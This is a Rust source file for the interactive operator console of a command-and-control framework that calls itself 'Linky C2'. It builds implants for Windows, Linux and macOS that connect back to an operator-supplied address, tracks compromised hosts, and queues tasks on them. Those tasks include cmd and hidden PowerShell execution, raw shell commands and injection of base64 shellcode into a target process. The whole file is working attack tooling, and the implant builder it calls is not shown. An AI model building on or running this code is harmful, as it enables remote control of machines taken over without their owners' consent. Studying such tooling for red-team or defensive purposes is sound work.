use colored::Colorize;
use rustyline::{error::ReadlineError, DefaultEditor};
use std::sync::{Arc, Mutex};
use uuid::Uuid;

use crate::generate;
use crate::links::{LinkStatus, Links};

pub fn run(links: Arc<Mutex<Links>>) {
    tracing::info!("{}", "Linky C2 – type 'help' for commands\n".bold());

    let mut rl = DefaultEditor::new().expect("readline init failed");

    loop {
        match rl.readline("linky> ") {
            Ok(line) => {
                let line = line.trim().to_string();
                if line.is_empty() {
                    continue;
                }
                rl.add_history_entry(&line).ok();

                let (cmd, rest) = split_first(&line);
                match cmd {
                    "links" => links_menu(&links, &mut rl),
                    "generate" => {
                        if rest.is_empty() {
                            tracing::info!("Usage: generate <ip:port>");
                        } else {
                            generate::generate_windows(rest);
                        }
                    }
                    "generate-linux" => {
                        if rest.is_empty() {
                            tracing::info!("Usage: generate-linux <ip:port>");
                        } else {
                            generate::generate_linux(rest);
                        }
                    }
                    "generate-native" => {
                        if rest.is_empty() {
                            tracing::info!("Usage: generate-native <ip:port>");
                        } else {
                            generate::generate_native(rest);
                        }
                    }
                    "generate-osx" => {
                        if rest.is_empty() {
                            tracing::info!("Usage: generate-osx <ip:port>");
                        } else {
                            generate::generate_osx(rest);
                        }
                    }
                    "help" => print_help(),
                    "exit" | "quit" | "kill" => {
                        tracing::info!("Exiting.");
                        std::process::exit(0);
                    }
                    _ => tracing::info!("Unknown command '{}'. Type 'help'.", cmd),
                }
            }
            Err(ReadlineError::Interrupted) | Err(ReadlineError::Eof) => {
                tracing::info!("\nExiting.");
                std::process::exit(0);
            }
            Err(e) => tracing::error!("readline error: {}", e),
        }
    }
}

// ── Links submenu ────────────────────────────────────────────────────────────

fn links_menu(links: &Arc<Mutex<Links>>, rl: &mut DefaultEditor) {
    tracing::info!("\n{}", "╔══════════════════════════════╗".cyan().bold());
    tracing::info!("{}", "║          LINKS MENU          ║".cyan().bold());
    tracing::info!("{}\n", "╚══════════════════════════════╝".cyan().bold());
    print_links_table(links);

    loop {
        match rl.readline("\x01\x1b[31m\x02links> \x01\x1b[0m\x02") {
            Ok(line) => {
                let line = line.trim().to_string();
                if line.is_empty() {
                    continue;
                }
                rl.add_history_entry(&line).ok();
                let (cmd, rest) = split_first(&line);

                match cmd {
                    "-h" | "help" => {
                        tracing::info!(
                            "  {}          Show all links (including inactive)",
                            "-a".yellow()
                        );
                        tracing::info!("  {}   Interact with a link", "-i <name>".yellow());
                        tracing::info!("  {}   Send kill task + mark exited", "-k <name>".yellow());
                        tracing::info!("  {}        Return to main menu", "back".yellow());
                    }
                    "-a" => print_links_table(links),
                    "-i" => {
                        if rest.is_empty() {
                            tracing::info!("Usage: -i <name>");
                        } else if let Some(id) = resolve_link(links, rest) {
                            interact(links, id, rl);
                        } else {
                            tracing::info!("{} Link not found: {}", "[-]".red(), rest);
                        }
                    }
                    "-k" => {
                        if rest.is_empty() {
                            tracing::info!("Usage: -k <name>");
                        } else if let Some(id) = resolve_link(links, rest) {
                            let mut l = links.lock().unwrap();
                            l.add_task(id, "exit".into(), "kill".into());
                            l.kill_link(id);
                            tracing::info!("{} Kill task queued.", "[+]".green());
                        } else {
                            tracing::info!("{} Link not found: {}", "[-]".red(), rest);
                        }
                    }
                    "back" | "exit" | "q" => break,
                    "generate" | "generate-linux" | "generate-native" | "links" | "kill"
                    | "quit" => {
                        tracing::info!(
                            "'{}' is a top-level command. Type 'back' to return to the main menu first.",
                            cmd
                        );
                    }
                    _ => tracing::info!("Unknown command '{}'. Type -h for help.", cmd),
                }
            }
            Err(ReadlineError::Interrupted) | Err(ReadlineError::Eof) => break,
            Err(e) => tracing::error!("readline: {}", e),
        }
    }
}

fn print_links_table(links: &Arc<Mutex<Links>>) {
    let links = links.lock().unwrap();
    let all = links.all_links();
    if all.is_empty() {
        tracing::info!("{} No links registered.", "[*]".cyan());
        return;
    }
    tracing::info!(
        "\n{}",
        format!(
            "{:<12} {:<24} {:<18} {:<12} {:<10}",
            "Name", "User@Host", "IP", "Platform", "Status"
        )
        .cyan()
        .bold()
    );
    tracing::info!("{}", "─".repeat(78).cyan());
    for l in all {
        let status = status_colored(&l.status);
        tracing::info!(
            "{:<12} {:<24} {:<18} {:<12} {}",
            l.name,
            format!("{}@{}", l.username, l.hostname),
            l.internal_ip,
            l.platform,
            status,
        );
    }
}

// ── Per-link interaction ─────────────────────────────────────────────────────

fn interact(links: &Arc<Mutex<Links>>, link_id: Uuid, rl: &mut DefaultEditor) {
    {
        let l = links.lock().unwrap();
        if let Some(link) = l.get_link(link_id) {
            tracing::info!(
                "\n{} Interacting with {} – {}@{} [{}]",
                "[*]".cyan(),
                link.name.bold(),
                link.username,
                link.hostname,
                link.platform.yellow()
            );
            tracing::info!("    Type 'help' for commands, 'back' to return\n");
        }
    }

    loop {
        let prompt = {
            let l = links.lock().unwrap();
            l.get_link(link_id)
                .map(|lk| format!("{}> ", lk.name))
                .unwrap_or_else(|| "link> ".into())
        };

        match rl.readline(&prompt) {
            Ok(line) => {
                let line = line.trim().to_string();
                if line.is_empty() {
                    continue;
                }
                rl.add_history_entry(&line).ok();
                let (cmd, args) = split_first(&line);

                match cmd {
                    "help" => print_link_help(),
                    "back" | "exit" => break,
                    "info" => show_info(links, link_id),
                    "kill" => {
                        let mut l = links.lock().unwrap();
                        l.add_task(link_id, "exit".into(), "kill".into());
                        l.kill_link(link_id);
                        tracing::info!("{} Kill task queued.", "[+]".green());
                        break;
                    }

                    // ── Shell execution helpers ──────────────────────────
                    "cmd" => {
                        if !is_windows(links, link_id) {
                            tracing::info!("{} 'cmd' is a Windows-only command.", "[-]".red());
                        } else {
                            queue(links, link_id, format!("cmd /C {}", args), line.clone());
                        }
                    }
                    "shell" => queue(links, link_id, line.clone(), line.clone()),
                    "powershell" | "ps" => {
                        if !is_windows(links, link_id) {
                            tracing::info!("{} 'powershell' is a Windows-only command.", "[-]".red());
                        } else {
                            queue(
                                links,
                                link_id,
                                format!("powershell -noP -sta -w 1 -c \"{}\"", args),
                                line.clone(),
                            );
                        }
                    }

                    // ── Built-in navigation ─────────────────────────────
                    "cd" | "pwd" | "ls" | "whoami" | "pid" => {
                        queue(links, link_id, line.clone(), line.clone())
                    }
                    "integrity" => {
                        if !is_windows(links, link_id) {
                            tracing::info!("{} 'integrity' is a Windows-only command.", "[-]".red());
                        } else {
                            queue(links, link_id, line.clone(), line.clone());
                        }
                    }

                    // ── Process injection ───────────────────────────────
                    "inject" => {
                        if !is_windows(links, link_id) {
                            tracing::info!("{} 'inject' is a Windows-only command.", "[-]".red());
                        } else {
                            queue(links, link_id, line.clone(), line.clone());
                        }
                    }

                    // ── Catch-all: send raw ─────────────────────────────
                    _ => queue(links, link_id, line.clone(), line.clone()),
                }
            }
            Err(ReadlineError::Interrupted) | Err(ReadlineError::Eof) => break,
            Err(e) => tracing::error!("readline: {}", e),
        }
    }
}

fn show_info(links: &Arc<Mutex<Links>>, link_id: Uuid) {
    let l = links.lock().unwrap();
    if let Some(link) = l.get_link(link_id) {
        tracing::info!("  Name      : {}", link.name);
        tracing::info!("  ID        : {}", link.id);
        tracing::info!("  User      : {}@{}", link.username, link.hostname);
        tracing::info!("  Internal  : {}", link.internal_ip);
        tracing::info!("  Platform  : {}", link.platform);
        tracing::info!("  PID       : {}", link.pid);
        tracing::info!(
            "  First seen: {}",
            link.first_checkin.format("%Y-%m-%d %H:%M:%S")
        );
        tracing::info!(
            "  Last seen : {}",
            link.last_checkin.format("%Y-%m-%d %H:%M:%S")
        );
        tracing::info!("  {}    : {}", "Status".cyan(), status_colored(&link.status));
    }
}

fn is_windows(links: &Arc<Mutex<Links>>, link_id: Uuid) -> bool {
    links
        .lock()
        .unwrap()
        .get_link(link_id)
        .map(|l| l.platform == "windows")
        .unwrap_or(false)
}

fn queue(links: &Arc<Mutex<Links>>, link_id: Uuid, command: String, cli_cmd: String) {
    let mut l = links.lock().unwrap();
    l.add_task(link_id, command, cli_cmd);
}

fn resolve_link(links: &Arc<Mutex<Links>>, name: &str) -> Option<Uuid> {
    links.lock().unwrap().get_link_by_name(name).map(|l| l.id)
}

// ── Helpers ──────────────────────────────────────────────────────────────────

fn status_colored(status: &LinkStatus) -> String {
    match status {
        LinkStatus::Active => "Active".green().bold().to_string(),
        LinkStatus::Inactive => "Inactive".yellow().to_string(),
        LinkStatus::Exited => "Exited".red().to_string(),
    }
}

/// Split "cmd rest…" → ("cmd", "rest…").
fn split_first(s: &str) -> (&str, &str) {
    match s.find(' ') {
        Some(i) => (&s[..i], s[i + 1..].trim_start()),
        None => (s, ""),
    }
}

fn print_help() {
    tracing::info!("  links                    Manage active links");
    tracing::info!("  generate <ip:port>       Build Windows implant (x86_64-pc-windows-gnu)");
    tracing::info!("  generate-linux <ip:port> Build Linux implant   (x86_64-unknown-linux-musl)");
    tracing::info!("  generate-native <ip:port> Build native Linux implant (x86_64-unknown-linux-gnu)");
    tracing::info!("  generate-osx <ip:port>   Build macOS implant   (x86_64-apple-darwin)");
    tracing::info!("  help                     Show this help");
    tracing::info!("  exit / kill              Quit linky");
}

fn print_link_help() {
    tracing::info!("  cmd <args>          Execute via cmd.exe /C <args>");
    tracing::info!("  shell <cmd>         Send raw command string");
    tracing::info!("  powershell <args>   Execute via powershell.exe");
    tracing::info!("  ls [path]           List directory");
    tracing::info!("  cd <path>           Change directory");
    tracing::info!("  pwd                 Print working directory");
    tracing::info!("  whoami              Current user (domain\\user)");
    tracing::info!("  pid                 Process ID");
    tracing::info!("  integrity           Token integrity level");
    tracing::info!("  inject <pid> <b64>  Inject base64 shellcode into PID");
    tracing::info!("  info                Show link metadata");
    tracing::info!("  kill                Send exit + mark link dead");
    tracing::info!("  back                Return to links menu");
}
